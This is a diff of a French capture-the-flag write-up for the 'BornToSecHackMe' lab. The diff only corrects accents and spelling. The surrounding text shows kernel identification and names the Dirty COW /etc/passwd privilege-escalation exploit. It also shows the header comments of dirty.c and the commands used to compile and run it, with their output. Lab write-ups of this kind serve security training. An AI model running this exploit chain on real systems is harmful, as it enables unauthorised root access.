@@ -1,6 +1,6 @@
 # Dirtycow
 
-On cherche a savoir sur quelle version de **Kernel** on est :
+On cherche à savoir sur quelle version de **Kernel** on est :
 <pre><code>> uname -a
 Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux
 </code></pre>
@@ -11,7 +11,7 @@ On trouve un exploit nommé **dirtycow** qui est basé sur une **race-condition-
 
 <pre>Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)</pre>
 
-On se connecte en **ssh** a n'import quel user (zaz ici), et on creer le fichier **dirty.c** : 
+On se connecte en **ssh** à n'importe quel user (zaz ici), et on créé le fichier **dirty.c** : 
 <pre><code>//
 // This exploit uses the pokemon exploit of the dirtycow vulnerability
 // as a base and automatically generates a new passwd line.
@@ -207,7 +207,7 @@ int main(int argc, char *argv[])
 }
 </code></pre>
 
-On compile et execute :
+On compile et éxecute :
 <pre><code>> gcc -pthread dirty.c -o dirty -lcrypt
 > ./dirty test
 /etc/passwd successfully backed up to /tmp/passwd.bak
